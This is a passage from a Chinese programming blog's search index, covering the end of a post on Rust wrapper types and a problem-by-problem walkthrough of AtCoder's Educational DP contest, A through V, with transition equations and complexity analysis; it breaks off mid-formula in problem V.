c.get(); } Cell\u003cT\u003e 和 RefCell\u003cT\u003e 都没有实现 Send，所以他们也都是不能跨线程访问的。 ","date":"2020-11-24","objectID":"/post/b63a9600/:4:0","tags":["Rust","智能指针","包装类型"],"title":"Rust 的包装类型","uri":"/post/b63a9600/"},{"categories":["技术笔记"],"content":"Mutex 与 RwLock Mutex\u003cT\u003e 和 RwLock\u003cT\u003e 不是锁吗？为什么会出现在包装类型的文章里？ 对于 Rust 来说，Mutex\u003cT\u003e 和 RwLock\u003cT\u003e 都与一个内部可变的资源强绑定，并且提供了运行时的锁竞争检查机制，实现了 Send。除此之外，这两类型的语义和约束与 Cell\u003cT\u003e 以及 RefCell\u003cT\u003e 差不了太多，就不再展开说了。 这次的 🌰 可以直接看 Mutex\u003cT\u003e 的官网样例 和 RwLock\u003cT\u003e 的官网样例。 ","date":"2020-11-24","objectID":"/post/b63a9600/:5:0","tags":["Rust","智能指针","包装类型"],"title":"Rust 的包装类型","uri":"/post/b63a9600/"},{"categories":["技术笔记"],"content":"区别及用途 我们首先可以看到下面这个表格： 类型 所有权 修改语义 引用检查 Send Box\u003cT\u003e 唯一 可变引用修改 编译期 未实现 Rc\u003cT\u003e 多重 可变引用修改 编译期 未实现 Arc\u003cT\u003e 多重 可变引用修改 编译期 实现 Cell\u003cT\u003e 唯一 内部可变性 编译期 未实现 RefCell\u003cT\u003e 唯一 内部可变性 运行时（引用计数） 未实现 Mutex\u003cT\u003e 唯一 内部可变性 运行时（锁竞争检查） 实现 RwLock\u003cT\u003e 唯一 内部可变性 运行时（锁竞争检查） 实现 简单来说，你需要考虑下面的问题： 考虑资源的所有权，只允许单一所有权还是多重所有权？ 对于可以被修改的资源，提供可变引用还是内部可变性？ 引用检查是静态的还是运行时的？ 是否需要跨线程？是否提供锁的机制？ 搞明白了这些问题，该如何选择就一目了然了。同时，在标准库中，这些包装类型均推荐组合使用来实现更复杂的予以包装，例如多线程中传递 Mutex，我们应该使用 Arc\u003cMutex\u003cT\u003e\u003e。 Rust 的包装类型之旅到这里就结束了。可以看到，Rust 为了解决多种语义的覆盖问题，巧妙的设计了这几种模型并实现成为了标准库，给了用户充分的灵活性的同时避免了来自于 C/C++ 中的语义不清晰甚至是歧义的问题，在默认移动语义的基础上实现了精细化的堆内存管理控制。不过，也有人批评这种标准实现太过繁琐，我们也许只需要一些约定然后提供简单的封装，复杂的需求交给各自或者第三方实现也许会更好。孰是孰非，还是交给语言的使用者决断吧。 ","date":"2020-11-24","objectID":"/post/b63a9600/:6:0","tags":["Rust","智能指针","包装类型"],"title":"Rust 的包装类型","uri":"/post/b63a9600/"},{"categories":["趣题记录"],"content":"这篇文章已经咕了一年了，原先的前言已经完全脱离时代了，在第一版到最终成文的期间过去了很多事情，趁现在毕业前夕有点时间迅速把坑给填了，也算是给大学和竞赛生涯画个句号吧。 这次的刷题对象是 AtCoder 的 Educational DP Round。从简单到困难的问题都有，倒挺适合我这种不会 DP 的人的。 我的题解习惯是不贴代码的，所以下面所有的都是关于题目的讲解和方程的推导，要看代码参考Github或者提交页面。 ","date":"2020-04-28","objectID":"/post/77ee4cf4/:0:0","tags":["AtCoder","dp","动态规划","算法","题解","趣题记录"],"title":"Educational DP 题解","uri":"/post/77ee4cf4/"},{"categories":["趣题记录"],"content":"A. Frog 1 最基础的 DP 了吧，考虑到第 $i$ 格只有两种走法，则最小花费就是这两种里面二选一就可以了啊。 转移方程就是： $$ \\text{dp}[i] = \\min\\{\\text{dp}[i-1]+|h_i-h_{i-1}|,\\text{dp}[i-2]+|h_i-h_{i-2}|\\} $$ 答案就是 $\\text{dp}[N]$。$\\mathcal{O}(N)$ 时间递推过去就可以了。 ","date":"2020-04-28","objectID":"/post/77ee4cf4/:1:0","tags":["AtCoder","dp","动态规划","算法","题解","趣题记录"],"title":"Educational DP 题解","uri":"/post/77ee4cf4/"},{"categories":["趣题记录"],"content":"B. Frog 2 这个 DP 就是在上面扩展了一下，枚举一下距离就行。 转移方程： $$ \\text{dp}[i] = \\min_{1\\le j\\le k}\\{\\text{dp}[i-j]+|h_i-h_{i-j}|\\} $$ 答案是 $\\text{dp}[N]$。$\\mathcal{O}(NK)$ 时间枚举一下就可以了。 ","date":"2020-04-28","objectID":"/post/77ee4cf4/:2:0","tags":["AtCoder","dp","动态规划","算法","题解","趣题记录"],"title":"Educational DP 题解","uri":"/post/77ee4cf4/"},{"categories":["趣题记录"],"content":"C. Vacation 实际上不选择相同的活动我们可以这么来想：我们每次从两个没选过的活动里面选一个最大值就行。那么状态就应该是 $\\text{dp}[i][0/1/2]$，$0,1,2$ 代表第 $i$ 天选择的活动的项目，具体怎么编码都可以。 那么转移方程就是： $$ \\text{dp}[i][j] = \\max_{0\\le k\\le2\\land k\\ne j}\\{\\text{dp}[i-1][k]\\}+\\text{score}[i][j] $$ 答案就是 $\\max_{0\\le k\\le 2}\\{\\text{dp}[N][k]\\}$。 复杂度 $\\mathcal{O}(N)$。 ","date":"2020-04-28","objectID":"/post/77ee4cf4/:3:0","tags":["AtCoder","dp","动态规划","算法","题解","趣题记录"],"title":"Educational DP 题解","uri":"/post/77ee4cf4/"},{"categories":["趣题记录"],"content":"D. Knapsack 1 模板 01 背包问题。设 $\\text{dp}[i][j]$ 代表选了前 $i$ 件物品中体积为 $j$ 的最大价值。 转移方程： $$ \\text{dp}[i][j] = \\max\\{\\text{dp}[i-1][j], \\text{dp}[i-1][j-w_i]+v_i\\} $$ 答案是 $\\text{dp}[N][W]$。复杂度 $\\mathcal{O}(NW)$。 一个常见的省内存技巧是，注意到 $i$ 仅和上一轮，即 $i-1$ 有关，我们可以省略掉这一维，然后数组滚动使用即可。这样的要求是，我们需要倒序枚举体积：如果我们顺序枚举，那么我们更新的时候会使用 $i$ 轮去更新 $i$ 轮，就不是从 $i-1$ 轮更新过来了。这个观察应该还是比较自然的。 ","date":"2020-04-28","objectID":"/post/77ee4cf4/:4:0","tags":["AtCoder","dp","动态规划","算法","题解","趣题记录"],"title":"Educational DP 题解","uri":"/post/77ee4cf4/"},{"categories":["趣题记录"],"content":"E. Knapsack 2 这个题好玩。由于总体积非常大 ($10^9$)，我们在常规背包的技巧中经常使用的按体积 dp 价值就不行了。这个时候我们反着过来，考虑到总价值上限不大 ($10^5$)，我们来这样 dp：看某个价值 $i$ 需要的最小体积。 $\\text{dp}[i][j]$ 代表的就是对于前 $i$ 件物品，价格为 $j$ 的最小体积。那么，转移方程就应该这么写： $$ \\text{dp}[i][j] = \\min\\{\\text{dp}[i-1][j], \\text{dp}[i-1][j-v_i]+w_i\\} $$ 最后的答案就是 $\\max_{1\\le i\\le V}\\{i\\cdot[\\text{dp}[N][i]\\le W]\\}$。复杂度是 $\\mathcal{O}(NV)$ 的。常用的倒序枚举一维滚动优化是不变的，只是第二层的上限从体积变成了总价值。 ","date":"2020-04-28","objectID":"/post/77ee4cf4/:5:0","tags":["AtCoder","dp","动态规划","算法","题解","趣题记录"],"title":"Educational DP 题解","uri":"/post/77ee4cf4/"},{"categories":["趣题记录"],"content":"F. LCS 模板最长相同子序列问题。设 $\\text{dp}[i][j]$ 代表序列 $s[1..i]$ 和序列 $t[1..j]$ 的最长相同子序列的长度，考虑 $s[i]$ 和 $t[j]$： 假如 $s[i]=t[j]$，那么证明当前字符参与 LCS 的构建。 否则，最长的 LCS 应该是我们从这两个字符中选择能带来较大 LCS 那个。 所以，转移方程就应该是： $$ \\text{dp}[i][j]=\\begin{cases} \\text{dp}[i-1][j-1]\u0026,s[i]=t[j] \\\\\\max\\{\\text{dp}[i][j-1], \\text{dp}[i-1][j]\\}\u0026,s[i]\\ne t[j] \\end{cases} $$ 答案就是 $\\text{dp}[N][M]$，其中 $N, M$ 分别是序列 $s$ 和 $t$ 的长度。复杂度 $\\mathcal{O}(NM)$。 这题比较麻烦的是找出这个 LCS。这里我们的技巧叫做 正着 DP，倒着搜索 。意思就是，我们先正着把这个答案 dp 出来，然后我们从 $\\text{dp}[N][M]$ 出发去找答案：由于参与到 LCS 构建的字符一定满足 $\\text{dp}[i][j] = \\text{dp}[i-1][j-1]+1$，那么我们就倒着去测试是否某个点满足这个条件即可，否则贪心往 $\\text{dp}[i-1][j], \\text{dp}[i][j-1]$ 这里面等于 $\\text{dp}[i][j]$ 的那个搜过去。 ","date":"2020-04-28","objectID":"/post/77ee4cf4/:6:0","tags":["AtCoder","dp","动态规划","算法","题解","趣题记录"],"title":"Educational DP 题解","uri":"/post/77ee4cf4/"},{"categories":["趣题记录"],"content":"G. Longest Path DAG 上的 DP。很直观的来说，我们需要找到最长路，每次一定要从某个起点出发，所以我们可以先拓扑排序一下，然后逐个 dp 就可以了。容易观察到的是，这两个过程并不冲突，所以我们完全可以合并在一起，一边拓扑排序一边 dp。 设 $\\text{dp}[v]$ 代表从以节点 $v$ 为终点的最长路的长度，那么转移方程就应该是： $$ \\text{dp}[v] = \\max_{1\\le u\\le n\\wedge\u003cu,v\u003e}\\{\\text{dp}[u]\\}+1 $$ 答案自然就是 $\\max_{1\\le i\\le N}\\{\\text{dp}[i]\\}$。复杂度就是拓扑排序的复杂度，$\\mathcal{O}(N+M)$。实现应该还有一些细节需要考虑一下。 ","date":"2020-04-28","objectID":"/post/77ee4cf4/:7:0","tags":["AtCoder","dp","动态规划","算法","题解","趣题记录"],"title":"Educational DP 题解","uri":"/post/77ee4cf4/"},{"categories":["趣题记录"],"content":"H. Grid 模板题。设 $\\text{dp}[i][j]$ 是从 $(1,1)$ 走到 $(i,j)$ 的方案数，那么： 如果 $(i,j)$ 不可达，自然就是 $0$。 否则，只能从 $\\text{dp}[i-1][j]$ 和 $\\text{dp}[i][j-1]$ 两格中的某一格过来。 所以，转移方程就是： $$ \\text{dp}[i][j]=\\begin{cases} 0\u0026,(i,j)\\text{ is not reachable} \\\\\\text{dp}[i-1][j]+\\text{dp}[i][j-1]\u0026,\\text{otherwise} \\end{cases} $$ 答案就是 $\\text{dp}[H][W]$，记得一步一模。复杂度 $\\mathcal{O}(HW)$。 ","date":"2020-04-28","objectID":"/post/77ee4cf4/:8:0","tags":["AtCoder","dp","动态规划","算法","题解","趣题记录"],"title":"Educational DP 题解","uri":"/post/77ee4cf4/"},{"categories":["趣题记录"],"content":"I. Coins 概率 DP。我们设 $\\text{dp}[i][j]$ 代表有 $i$ 个硬币是正面，$j$ 个硬币是反面的概率，那么这个状态其实也并不难想。 多了一枚硬币的情况有两种： 多了一枚正面硬币，这是从 $\\text{dp}[i-1][j]$ 的情况过来的。 多了一枚反面硬币，这是从 $\\text{dp}[i][j-1]$ 的情况过来的。 又由于上面的所有情况都只会少 1 枚硬币，这也就提示我们，可以按硬币数来 dp：枚举当前局面有多少硬币，然后对所有可能的 $i, j$ 情况做讨论即可。由于我们自然从上一轮带过来的，所以我们滚动少了一个维度。 那么，假设当前局面有 $m$ 枚硬币，有 $i$ 枚硬币是正面，我们很容易得到如下的转移方程： $$ \\text{dp}[i][m-i] = \\text{dp}[i-1][m-i]\\cdot p_m + \\text{dp}[i][m-i-1]\\cdot(1-p_m) $$ 这样的话，针对每一个 $m$ 枚举 $i$ 即可。容易观察到上述过程是 $\\mathcal{O}(N^2)$ 的。 最终答案就是 $\\sum_{\\frac{N}{2}\\le i\\le N}\\text{dp}[i][N-i]$。 ","date":"2020-04-28","objectID":"/post/77ee4cf4/:9:0","tags":["AtCoder","dp","动态规划","算法","题解","趣题记录"],"title":"Educational DP 题解","uri":"/post/77ee4cf4/"},{"categories":["趣题记录"],"content":"J. Sushi 期望 DP。考虑当前有 $a$ 盘寿司有 $1$ 个，$b$ 盘有 $2$ 个，$c$ 盘有 $3$ 个，那么 $\\text{dp}[a][b][c]$ 就是所求的期望，答案就是 $\\text{dp}[cnt_1][cnt_2][cnt_3]$。接下来考虑转移：设 $d=a+b+c$，考虑投骰子，投到 $a,b,c$ 的概率就是 $\\frac{a}{d}, \\frac{b}{d},\\frac{c}{d}$，乘一下数就可以了。而投到这 $d$ 面的期望次数等于 $\\sum_{k=1}^\\infty k(\\frac{n-d}{n})^{k-1}\\frac{d}{n}$，显然就是 $\\frac{n}{d}$。根据期望的线性性，把它们全部加起来就可以了。 那么转移方程就是： $$ \\text{dp}[a][b][c] = \\frac{n}{d} + \\text{dp}[a-1][b][c]\\cdot\\frac{a}{d}+\\text{dp}[a+1][b-1][c]\\cdot\\frac{b}{d}+\\text{dp}[a][b+1][c-1]\\cdot\\frac{c}{d} $$ 复杂度是 $\\mathcal{O}(N^3)$。实现就 dfs 记忆化算一下就行了。 ","date":"2020-04-28","objectID":"/post/77ee4cf4/:10:0","tags":["AtCoder","dp","动态规划","算法","题解","趣题记录"],"title":"Educational DP 题解","uri":"/post/77ee4cf4/"},{"categories":["趣题记录"],"content":"K. Stones 完蛋，博弈论。老外是不是很喜欢把所有和递推有关的题目不管带不带子问题重合都叫做 DP 啊？ SG 定理与 SG 函数 现学现卖的 SG 定理和函数啊。SG 定理说的是，某个游戏的 SG 函数等于各个子游戏的 SG 函数的 Nim 和。先分清两个概念，对于 $\\text{SG}(x)$，我们指的是对于局面 $x$ 的函数值，而对于 $\\text{SG}(G)$，我们指的是游戏 $G$ 的函数值。假设游戏 $G$ 的初始状态是 $x_G$，那么可以简单理解为 $\\text{SG}(G) = \\text{SG}(x_G)$。那么显然，对于游戏 $G=\\sum_{i=1}^pG_i$，$\\text{SG}(G)=\\bigoplus_{i=1}^p\\text{SG}(G_i)$。 下面是一些基础知识：首先是在双方都最理智的操作下，我们的必胜点就是当前局面一定能导向当前操作的人是必胜的，必败点相反。容易观察的是，对于无偏组合游戏，我们的胜负仅和当前的局面有关，而和操作人和操作顺序等无关。那么我们有以下三条定理： 所有的终结点都是必败点。 必胜点至少有一个后继为必败点。 无论如何操作，所有必败点的后继都是必胜点。 第一个理解是显然的，由于存在无法进行任何操作的点，此点同样也就是必败点。后两个的理解比较麻烦，找点专业的书讲的肯定比我好。 下面就是 SG 函数的定义。$\\text{SG}(x) = \\text{mex}(S)$。$S$ 是 $x$ 的所有后继局面 SG 函数值的集合，$\\text{mex}$ 运算是不属于这个集合的最小非负整数，如 $\\text{mex}({0,1,2,4})=3,\\text{mex}({2,3,5})=0$。显而易见的是，对于一个无法操作的状态 $p$，显然是必败态，则 $\\text{SG}(p)=0$。同时我们也有，所有 $\\text{SG}(x)=0$ 的局面 $x$ 都是必败状态。 具体求 SG 函数的话大概就是对每一个后继状态的 SG 函数值打一个 vis 标记，然后找到第一个没有 vis 标记的值。这个简单的子问题要枚举要 dfs 要二分就看大家各显神通了。同时打表找规律也是个办法。 那么这个题其实就很简单了，由于可选的后继状态和当前剩余的石子数量正相关，我们从小开始递推就可以了，每一个去分解 $x-a_i$ 然后求出所有的 SG 函数值最后对 $K$ 的询问做出回答就行。显然对于每一个 $i\\le K$，需要枚举每一堆可选石子，所以复杂度 $\\mathcal{O}(NK)$。 ","date":"2020-04-28","objectID":"/post/77ee4cf4/:11:0","tags":["AtCoder","dp","动态规划","算法","题解","趣题记录"],"title":"Educational DP 题解","uri":"/post/77ee4cf4/"},{"categories":["趣题记录"],"content":"L. Deque 区间 DP + 记忆化搜索。题目虽然没说明，但是在 Sample 里面说明了是 Taro 先开始操作的。我们考虑 $\\text{dp}[l][r][0/1]$，代表选择区间 $[l,r]$，当前操作的人是 $0$ 或者 $1$ 的最优 $X-Y$。如果我们编码 $0$ 是 Taro 的话，那么答案就是 $\\text{dp}[1][N][0]$。 那么来推方程： 假如 $l=r$，那么根据当前的操作人，加减一下 $a_l$ 就可以了。 假如 $l\\ne r$，那么我当前的操作就是选择 $[l+1,r]$ 或者 $[l, r-1]$ 然后加上或者减去端点的值，根据策略取一下大小值就可以了。 所以转移方程就是： $$ \\text{dp}[l][r][cur]=\\begin{cases} a_l\u0026,l=r,cur=0 \\\\-a_l\u0026,l=r,cur=1 \\\\\\max\\{\\text{dp}[l+1][r][0]+a_l, \\text{dp}[l][r-1][0]+a_r\\}\u0026,l\\ne r,cur=0 \\\\\\min\\{\\text{dp}[l+1][r][1]-a_l, \\text{dp}[l][r-1][1]-a_r\\}\u0026,l\\ne r,cur=1 \\\\\\end{cases} $$ 考虑每个区间都会被枚举到，所以总复杂度是 $\\mathcal{O}(N^2)$ 的。由于大区间是依赖于子区间的，实现的时候可以 dfs 下去，然后记忆一下就可以了。 ","date":"2020-04-28","objectID":"/post/77ee4cf4/:12:0","tags":["AtCoder","dp","动态规划","算法","题解","趣题记录"],"title":"Educational DP 题解","uri":"/post/77ee4cf4/"},{"categories":["趣题记录"],"content":"M. Candies 做的时候不知道自己在想什么，实际上是个简单 DP。 设 $\\text{dp}[i][j]$ 代表分配了前 $i$ 个糖果，总共分配了 $j$ 个糖果的方案数，答案就是 $\\text{dp}[N][K]$。 下面来考虑转移。容易观察到的是，$\\text{dp}[i][0]=1$，因为只有前面的所有轮都分配了 $0$ 个糖果才能到这个状态，自然只有 1 种方案。而对于 $j\\ge1$ 的方程： $$ \\text{dp}[i][j] = \\sum_{p=1}^{\\min\\{a_i,j\\}}\\text{dp}[i-1][j-p] $$ 显然可以看出来后面的这个东西就是一个简单的前缀和，直接每次 $\\mathcal{O}(K)$ 的时间维护掉就可以了，这样转移的时候就少一个循环。 当然，前几个糖果那维可以滚动掉，懒得写了。复杂度 $\\mathcal{O}(NK)$。 ","date":"2020-04-28","objectID":"/post/77ee4cf4/:13:0","tags":["AtCoder","dp","动态规划","算法","题解","趣题记录"],"title":"Educational DP 题解","uri":"/post/77ee4cf4/"},{"categories":["趣题记录"],"content":"N. Slimes 应该是国内选手最熟的区间 DP 入门题吧，怎么给安排到 N 来了…… 就是 NOI 1995 那题石子合并原题简化版。考虑 $\\text{dp}[l][r]$ 代表合并区间 $[l,r]$ 的最小代价，那么答案自然就是 $\\text{dp}[1][N]$。 转移方程比较简单，从区间长度来枚举，由于只能相邻合并，那么考虑某个区间 $[l,r]$，我们可以选择区间内的任何位置 $p$ 为切断点，代表我们选择把石子堆 $[l,p]$ 和石子堆 $[p+1,r]$ 合并，那么不难发现代价就是 $\\text{dp}[l][p]+\\text{dp}[p+1][r]+\\sum_{i=l}^ra_i$。可以发现后面这个式子需要多次计算，求一个前缀和就可以了。 那么状态转移方程就是： $$ \\text{dp}[l][r]=\\min_{l\\le p\\le r}\\{\\text{dp}[l][p]+\\text{dp}[p+1][r]\\}+\\sum_{i=l}^ra_i $$ 由于我们相当于在枚举 $l, r$ 的同时还要枚举 $p$，复杂度显而易见是 $\\mathcal{O}(N^3)$ 的。 ","date":"2020-04-28","objectID":"/post/77ee4cf4/:14:0","tags":["AtCoder","dp","动态规划","算法","题解","趣题记录"],"title":"Educational DP 题解","uri":"/post/77ee4cf4/"},{"categories":["趣题记录"],"content":"O. Matching 状压 DP。 我们考虑这么设计状态：$\\text{dp}[i][j]$ 代表分配到男士 $i$ 且此时女士分配的方案是 $j$ 。那么这个方案的来源很简单：比如对于 $j=10010_{(2)}$，当前男士的分配方案自然可能会来自 $j=00010_{(2)}$ 或者 $j=10000_{(2)}$。也就是说，来自前一轮的这些方案的和，其中当前方案上选择了女士 k（j \u0026 (1 \u003c\u003c k)）且这位男士和这位女士可以配对（edge[i][k]）。 所以转移方程就应该是： $$ \\text{dp}[i][j] = \\sum_{k \\text{ in the choice} \\wedge \u003ci,k\u003e}\\text{dp}[i-1][j\\oplus2^k] $$ 然后我们又发现，由于我们知道了 $j$，我们自然就知道了当前轮分配了几个人，所以 $i$ 轮完全没用，直接给滚动掉。然后就可以直接 dp 了，答案是 $\\text{dp}[2^N-1]$，复杂度 $\\mathcal{O}(N\\cdot2^N)$。 ","date":"2020-04-28","objectID":"/post/77ee4cf4/:15:0","tags":["AtCoder","dp","动态规划","算法","题解","趣题记录"],"title":"Educational DP 题解","uri":"/post/77ee4cf4/"},{"categories":["趣题记录"],"content":"P. Independent Set 树形 DP 裸题。 设计状态很简单，设 $\\text{dp}[v][0/1]$ 代表节点 $v$ 为黑色/白色的方案数，从根 $\\text{rt}$ dfs 下去，答案就是 $\\text{dp}[\\text{rt}][0] + \\text{dp}[\\text{rt}][1]$。 转移的话也比较简单： $$ \\text{dp}[v][c]=\\begin{cases} \\prod_{u\\in\\text{son}(v)}\\text{dp}[u][1],\u0026c=0 \\\\\\prod_{u\\in\\text{son}(v)}(\\text{dp}[u][0]+\\text{dp}[u][1]),\u0026c=1 \\end{cases} $$ 直接从 1 dfs 就可以了。复杂度 $\\mathcal{O}(N)$。 ","date":"2020-04-28","objectID":"/post/77ee4cf4/:16:0","tags":["AtCoder","dp","动态规划","算法","题解","趣题记录"],"title":"Educational DP 题解","uri":"/post/77ee4cf4/"},{"categories":["趣题记录"],"content":"Q. Flowers 线段树/树状数组优化转移。 设 $\\text{dp}[i]$ 代表以 $i$ 为结尾的花的序列的最大美丽度，那么转移方程是非常显然的： $$ \\text{dp}[i]=\\max_{1\\le j\u003ci}\\{[h_j\u003ch_i]\\cdot\\text{dp}[j]\\}+a_i $$ 复杂度是显然的 $\\mathcal{O}(N^2)$，明显会 TLE。但由于 $h_i$ 是 $1\\sim n$ 的一个排列，那么可以用类似于树状数组求逆序数的方法：每次先查询 $1\\sim h_i$ 的最大值 $m_i$，然后就有 $\\text{dp}[i]=m_i+a_i$，然后再把 $\\text{dp}[i]$ 的值更新到点 $h_i$ 上。 这个显而易见的观察是，我们更新了某个点 $h_i$，假如查询了点 $h_j$，如果这个 $h_i \u003e h_j$，那么这个值只会出现在线段树的右侧，询问是不会求出这个值的。 所以用一棵维护区间最大值的线段树优化转移就行。由于树状数组维护的是区间前缀最大值，这里查询的也是区间前缀最大值，也可以用。复杂度 $\\mathcal{O}(N\\log N)$。 ","date":"2020-04-28","objectID":"/post/77ee4cf4/:17:0","tags":["AtCoder","dp","动态规划","算法","题解","趣题记录"],"title":"Educational DP 题解","uri":"/post/77ee4cf4/"},{"categories":["趣题记录"],"content":"R. Walk 矩阵快速幂求有向图长度为 $k$ 条数的裸题。 考虑存在 $u\\to v$ 和 $v\\to w$ 这样的两条路径，那么把这个矩阵相乘一次之后，就会出现 $u \\to w$ 这样的一条路，这条路的值根据矩阵乘法定义很容易得到就是前面两条路径的方案的乘积。 换个想法来说，这个过程类似于 Floyd：我们使用中心点考虑两个点之间的转移，也就是路径 $u\\to v$ 可以通过所有的中转点 $k$ 转移过来，其中存在这样的路径 $u\\to k$ 和 $k\\to v$。 那么就是跑一下矩阵快速幂然后统计答案就可以了，复杂度 $\\mathcal{O}(N^3\\log K)$。 ","date":"2020-04-28","objectID":"/post/77ee4cf4/:18:0","tags":["AtCoder","dp","动态规划","算法","题解","趣题记录"],"title":"Educational DP 题解","uri":"/post/77ee4cf4/"},{"categories":["趣题记录"],"content":"S. Digit Sum 数位 DP 模板题。 考虑定义 dfs(pos, rem, limit) 代表从高到低第 pos 位，余数为 rem 以及前一位是否到达了可取值的上限的状态，然后直接记忆化搜索就行。当且仅当 pos == -1 \u0026\u0026 rem == 0 的时候返回 1，否则 pos == -1 的时候返回 0。要注意的是初始状态 0 也会被记入，到最后答案需要减 1。 注意到余数不影响调用次数，总复杂度是 $\\mathcal{O}(\\log K)$ 级别的（如果有误或者有更好的的复杂度分析欢迎告诉我）。 ","date":"2020-04-28","objectID":"/post/77ee4cf4/:19:0","tags":["AtCoder","dp","动态规划","算法","题解","趣题记录"],"title":"Educational DP 题解","uri":"/post/77ee4cf4/"},{"categories":["趣题记录"],"content":"T. Permutation 想了一会儿没想出来，上 cf 看了个题解，豁然开朗。这套题我最喜欢的题目之一。 我们考虑定义 $\\text{dp}[i][j]$ 代表前 $i$ 个位置，我们使用 $1\\sim i$ 的排列满足了要求，且最后一个数为 $j$ 的方案数，易得答案即 $\\sum_{i=1}^n\\text{dp}[N][i]$。 转移过程非常精彩：我们考虑 $\\text{dp}[i+1][j]$，假如 $s[i]=\u003c$，说明 $j$ 这个数必须要比上一个数的最后一位要大，但是我们的 $j$ 有可能之前用到过（比如 $i=10, j=7$，显然 $\\text{dp}[10][7]$ 在前面是一个合法的答案），我们怎么避免这个情况呢？ 注意到前面是一个 $1\\sim i$ 的排列，如果我们以 $j-1$ 为分界线，把 $j-1$ 之后的数都加一，在不破坏整体的大小关系的情况下我们消除了 $j$，然后我们再把 $j$ 放到当前位置，我们就得到了 $i+1$ 这个排列！ 所以，针对于 $s[i]=\u003c$ 的情况，我们只需要对 $\\text{dp}[i][k], 1\\le k\u003cj$ 求一个和就得到了 $\\text{dp}[i+1][j]$ 的值；同理，对 $\\text{dp}[i][k], j\\le k\\le i$ 的值求一个和就是 $\\text{dp}[i+1][j]$ 在 $s[i]=\u003e$ 的情况的值了（我们使用了等号，因为假定上一个数为 $j$，那么加一之后 $j+1\u003ej$ 恒成立，也满足要求）。 所以，我们的转移方程非常简单： $$ \\text{dp}[i+1][j]=\\begin{cases} \\displaystyle{\\sum_{k=1}^{j-1}\\text{dp}[i][k]},\u0026s[i]=\u003c \\\\\\displaystyle{\\sum_{k=j}^{i}\\text{dp}[i][k]},\u0026s[i]=\u003e \\\\\\end{cases} $$ 注意到后面的求和是两个连续序列，直接前缀和每次 $\\mathcal{O}(N)$ 维护掉则下一轮就可以 $\\mathcal{O}(1)$ 转移了，总复杂度 $\\mathcal{O}(N^2)$。可以看出 $\\text{dp}$ 的第一维可以滚动掉，整个内存开销也变得非常小了。代码写出来也非常短。 ","date":"2020-04-28","objectID":"/post/77ee4cf4/:20:0","tags":["AtCoder","dp","动态规划","算法","题解","趣题记录"],"title":"Educational DP 题解","uri":"/post/77ee4cf4/"},{"categories":["趣题记录"],"content":"U. Grouping 状压 DP。一开始自己把自己给关了，实际上思路是对的。 令 $mask_{(2)}$ 中为 $1$ 的位代表已经选了的兔子，$\\text{dp}[mask]$ 为 $mask$ 下的答案，$\\text{score}[mask]$ 为 $mask$ 的兔子全为一组时的分数。 转移应该是比较简单的：我们首先算出来某一个 $mask$ 下的分数，并令 $\\text{dp}[mask]=\\text{score}[mask]$。接下来我们枚举 $mask$ 的子集，考虑某一个子集拿出来为单独的一组，看看能不能提高得分即可。所以转移方程是： $$ \\text{dp}[mask]=\\max\\{\\text{score}[mask], \\max_{submask\\subset mask}\\{\\text{dp}[mask\\oplus submask]+\\text{score}[submask]\\}\\} $$ $mask$ 从 $1$ 枚举到 $2^N-1$ 即可。转移过程中需要算一下得分或者 $\\mathcal{O}(N^22^N)$ 预处理出来。答案为 $\\text{dp}[2^N-1]$。 复杂度的分析比较奇妙。我们考虑一下需要的转移过程，易知 $\\{(mask, submask)\\}$ 构成了转移的状态集合，这个集合的大小就是最终的转移次数。考虑对于任意一对 $(mask, submask)$，在某一位上有下面三种情况： 这一位同为 $1$：代表我们选择将这只兔子绑定到其他组。 这一位 $mask$ 为 $1$ 而 $submask$ 为 $0$：代表这只兔子留在这一组内，我们选择其他的兔子拿出来构成新的组。 这一位同为 $0$：在原始方案下这只兔子就没有选。 由于每一位都是三种状态任选一种，总计的 $(mask, submask)$ 对的数量就有 $3^N$ 种，所以我们最终的复杂度就是 $\\mathcal{O}(3^N)$ 级别的。如果你前面预处理了得分，还需要加上预处理的复杂度。 一开始枚举子集常数比较神奇，1800ms 给卡过去了，看了看提交怎么有 103ms 的，然后抄了个没见过的子集枚举方法： for (int sub_state = (state - 1) \u0026 state; sub_state; sub_state = (sub_state - 1) \u0026 state) { // sub_state is a subset of state } 然后做操作就可以了，最后跑了个 98ms。 ","date":"2020-04-28","objectID":"/post/77ee4cf4/:21:0","tags":["AtCoder","dp","动态规划","算法","题解","趣题记录"],"title":"Educational DP 题解","uri":"/post/77ee4cf4/"},{"categories":["趣题记录"],"content":"V. Subtree 树形 DP 换根法转移。完全不会，写了一晚上。 设 $\\text{dp}[v]$ 为以 $v$ 为根的答案，容易得到 $\\text{dp}[v] =\\prod_{u\\in\\text{son}(v)}\\text{dp}[u]$。而对每个节点做一次 DP 复杂度显然是 $\\mathcal{O}(N^2)$ 的，显然无法承受，考虑优化。 换根法 换根法的题目一般询问的是每个节为根时候的性质（如 POJ 3585，以每个节点为源点的最大流）。 由于给定的是一棵树，我们根据树的性质显然可以导出，每个节点只和自己的子树有关。而另一个好性质是，当我们做一次 dfs 的时候，我们可以发现，每个节点会保存自己所有子树的答案，而真正的答案与这个部分答案的唯一差距就在这次 dfs 过程中的从父亲过来的这条边。 所以，通常我们的换根法是这么做的： 以任意节点为根，做一次自底向上的 DP。 从根节点出发，做一次自顶向下的 dfs，更新每一棵子树的答案。 而在这个过程中有一个显而易见的观察：对于更新过程 $u\\to v$，我们 dfs 过程中更新了 $\\text{dp}[u]$，那么当我们更新 $\\text{dp}[v]$ 的时候自然需要的是 $v\\to u$，这里的问题就在于如何删除 $u\\to v$ 的影响，进而再更新答案。这里不同题目的处理方法不同，比较灵活。 那么懂了换根法其实很简单，首先就是 dfs 下去得到任意根的答案，这个 DP 过程应该是显然的，然后是第二次的 dfs 更新答案。 设在第一次扫描过程中节点 $u$ 的 答案为 $f[u]$，显然，对我们选择的任意根 $\\text{rt}$，有 $\\text{dp}[\\text{rt}]=f[\\text{rt}]$。设每个节点的更新值为 $g[u]$，则 $g[\\text{rt}]=1$ 也是显然的。 接下来考虑任意节点 $v$，假设为 $u$ 的儿子，则容易得到下面的方程： $$ \\text{dp}[v]=f[v]\\cdot g[v] $$ $f[v]$ 在第一层 DP 过程中得到了，而 $g[v]$ 是多少？由于我们已经知道了根的答案，所以我们要取消当前节点对根答案的影响，这个贡献显然是 $f[v]+1$，而根节点此时为白色也是正确的答案，所以最后要加上 $1$ 来把贡献值调整正确。 所以，$g[v]$ 的值应该是： $$ g[v]=\\frac{\\text{dp}[u]}{f[v]+1}+1 $$ 那么再把式子完全打开就能得到： $$ 